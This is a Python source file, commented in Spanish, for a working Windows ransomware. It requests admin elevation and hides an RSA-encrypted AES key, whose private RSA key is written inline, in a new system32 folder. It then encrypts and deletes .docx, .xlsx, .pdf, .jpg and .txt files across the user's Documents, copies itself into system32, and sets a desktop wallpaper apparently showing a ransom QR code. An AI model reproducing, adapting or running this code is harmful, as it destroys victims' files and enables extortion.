import os
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Random import get_random_bytes
import shutil
from PIL import Image
import io
import ctypes
import sys


# Trata de escalar permisos, pide al usuario ejecutar como administrador
if not ctypes.windll.shell32.IsUserAnAdmin():
    # Si no se tienen permisos de administrador, volver a ejecutar con elevación de privilegios
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    sys.exit()



# Función para cifrar un archivo usando AES-256
def encrypt_aes(file_path, key):
    cipher = AES.new(key, AES.MODE_EAX)
    with open(file_path, 'rb') as f:
        plaintext = f.read()
        ciphertext, tag = cipher.encrypt_and_digest(plaintext)
        with open(file_path + '.encrypted', 'wb') as enc_file:
            enc_file.write(cipher.nonce + tag + ciphertext)

# Generar una llave aleatoria AES-256
key = get_random_bytes(32)

# Cifrar la llave AES-256 con RSA-2048 y guardarla
rsa_key_str ="""-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4PRtPIjY+t0tQnk8cZzhsdYhvrUHj+0XF+liDsjSUbVa68ki
tVPDyo9st5J3F6JTTdd2MD6dHVmlahjKLIzZYAZKFRN/Wtv+3NBtVZ+hp0yN6ike
YTMu/EPcdzLXLarsUFcl1dT3qJmgKcoPwCViYnrKVd1qQPXadvjBuacRgT8hIeEO
va3x/VlcXggSKCxgMIGDEW9kvWh84y2yxIQEFy23oShEFGjdbAHLtB85NRoLbhss
0vfuGGHa5FRRgqNYN4o/AS0M5iW7K+Kcgpdk/VuOC6ikU1QOFNLkT4+KCxJ4XQHk
eogXN4GDnTHBS9H5VwvSyG6ynSWgFJuZGjMvywIDAQABAoIBAG6T2Ap0nmwaQsA1
Rh/25P586tOKuy/ldH+dikUINFJT2mCi2zvU9B5jCCboiUAF2/scmY03ihW+VlBj
5SWnCsdn8AySK/0mvQ4gKk53jIfnWq8rDTLsbQE1/m5dgGaDaWxImmGVMTQgaBmC
qOFjvwv3nfQ9RZivAXeP6fJvjGxCBo3vLzW0sriXc1+VWwWt67xY9xgXoRwgAaut
ifef0FstNwdvgTQT9z+CEw4e32FfEwYTOI7x8aj8b3ez4cuigdA7O/EbQWlnwLYm
/Q7p8hA4pdvJ9Nx5ILQd41N3j4d7gL+V1dWzjYAyoDIOmFzl32CH6crUbccKa18b
cceyBZkCgYEA4XmseK14AHFyQTKlgkR1VWczzDBFHbSc8BWfNbnGxfwksE5AG9Mg
AKjkqnPmNLVAbrZbJpacvoeIFlOnELs0hVZPySgDeIGTfgbjgo2MUYujmUO0zL3g
vfe9EhS4zEo5/G5kpYLO8uyF8KXA6dYIzDgk98xIoh9UR/6fRJ7ILccCgYEA/2i2
zl2szC3ik6vsblCXidm5QJgE0MhnH1U+RzfgsUy6k/tKkB7ZwhsALxGHbkRPeR+s
hLJgD2oWGlLnrjUqS+yz8FOgRB5w7PziZ45+BBDyc1XVLc8ccnkJ592aKAPX3tGo
/NsGYZZKrfCbvfalbBox8LqachR96Mwhn9Sq/d0CgYAU9YZ+wUFCaUlBnj+cWFi/
05QRCvuhw0RDXP8rs1Uy2jle2idDbuCurwRyg8uGYsLWh8T5VU7EtzyDNst01rIP
IvLPtBR+gyz+rg0/+YBtpBlVCeIolg3qGrlMkPiMpOm2+VwJtpseIbZhpEbGdcrj
kOR+1FJ8H4VqG9UaP9hDyQKBgQD08vNnhXWEuHj1kUwGHGrJPTMq3OC5b4lfBnzd
Bp0KzYCfDcDb6YqEWyrY+WG+gesKSjNFbGEuR1r9Ugd6DukKue90jG9HBT7eOkXU
dVcsBSjRLj9uWJR6wNScN+5xdAYjX0ZHgrNjAiWLHhfvns3VmGXO7tfSkw6SJrwU
snxvTQKBgGSClmLAnlNtMY0trvOycduMDtHUYkOfSQsEXsHBwqhJTg2FjfaVZw7k
4/xOMEGtXmGCtwpd3gCwEyecSbk0hsWUXhQBmXyRw01kDHYZCFUkfF7m1yiGpD0N
2MPbVxI9WCxWdp87M/uF1F41+1Oph5Q1c2RMJ/siVW1QN68ZQ7c6
-----END RSA PRIVATE KEY-----"""   
rsa_key = RSA.import_key(rsa_key_str)
cipher_rsa = PKCS1_OAEP.new(rsa_key)
enc_key = cipher_rsa.encrypt(key)

with open('encrypted_key.bin', 'wb') as f:
    f.write(enc_key)

#print("Clave generada:", rsa_key)
#print("Clave AES cifrada con RSA:", enc_key)


# Crear un directorio en system32


system32_path = os.path.join(os.environ['WINDIR'], 'system32')
new_dir_path = os.path.join(system32_path, 'dragoncode_dir')
os.makedirs(new_dir_path, exist_ok=True)

# Mover el archivo encrypted_key.bin al directorio
shutil.move('encrypted_key.bin', os.path.join(new_dir_path, 'encrypted_key.bin'))

# Obtener la lista de archivos en el directorio de documentos del usuario
directory = os.path.expanduser('~') + '\\Documents\\'
file_extensions = ['.docx', '.xlsx', '.pdf', '.jpeg', '.jpg', '.txt']
script_name = os.path.basename(__file__)

for root, dirs, files in os.walk(directory):
    for file in files:
        if os.path.splitext(file)[1] in file_extensions and file != script_name:
            file_path = os.path.join(root, file)
            if os.path.basename(file) == 'image_data.txt':
                continue
            encrypt_aes(file_path, key)
            os.remove(file_path)

# Borrar la llave AES-256 de la memoria
del key


# Copiar el ejecutable al directorio system32

print('DESPUES DE ENCRIPTAR')
# Nombre del ejecutable actual
executable_name = os.path.basename(sys.argv[0])

# Ruta completa del ejecutable actual
current_executable_path = os.path.abspath(sys.argv[0])

# Ruta de destino en system32
destination_path = os.path.join(system32_path, executable_name)

# Copiar el ejecutable a system32 
shutil.copyfile(current_executable_path, destination_path)
print('DESPUES DE COPIAR SY32')


# Leer la representación hexadecimal de la imagen desde el archivo de texto

print('LEE IMAGEN')
script_directory = os.path.dirname(os.path.abspath(__file__))
txt_file_path = os.path.join(script_directory, 'image_data.txt')
with open(txt_file_path, 'r') as txt_file:
    hex_data = txt_file.read()

# Convertir la representación hexadecimal a una imagen

def hex_to_image(hex_data):
    image_data = bytes.fromhex(hex_data)
    return Image.open(io.BytesIO(image_data))


def set_wallpaper(image_path):
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)



# Guardar la imagen en el escritorio
print('GUARDA EN ESCRITORIO')
desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
image_path = os.path.join(desktop_path, 'IMPORTANTE.jpg')
image = hex_to_image(hex_data)
# Convertir la imagen a modo RGB antes de guardarla
image = image.convert('RGB')

# Redimensionar la imagen 
new_width = 800  # Cambia el ancho según lo desees
new_height = 600  # Cambia la altura según lo desees
image = image.resize((new_width, new_height))
image.save(image_path)

print('CAMBIA FONDO')
set_wallpaper(image_path)

print("\n\tIF YOU DONT GET TO SEE THE QR CODE, ADJUST YOUR DESKTOP WALLPAPER to 'ADJUST'!")

"""
# Mostrar la imagen abre un  visor de imagenes
image = hex_to_image(hex_data)
image.show()

"""